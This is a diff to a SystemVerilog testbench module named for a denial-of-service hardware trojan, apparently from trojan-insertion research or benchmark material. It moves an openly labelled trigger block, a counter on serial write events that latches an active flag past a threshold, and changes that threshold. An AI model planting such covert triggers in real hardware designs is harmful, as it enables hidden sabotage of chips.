@@ -33,24 +33,6 @@ module TestMain_trojan_DoS;
     `ifdef RSD_SYNTHESIS
         initial begin
             $error("Wrong compiler directive: RSD_SYNTHESIS");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 8358;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (serialWE) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
             $finish;
         end
     `endif
@@ -168,6 +150,23 @@ module TestMain_trojan_DoS;
         .posResetOut( rstOut ),
         .*
     );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=19991)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 19991;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (serialWE) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
 `ifdef RSD_SYNTHESIS_VIVADO
     always_comb begin
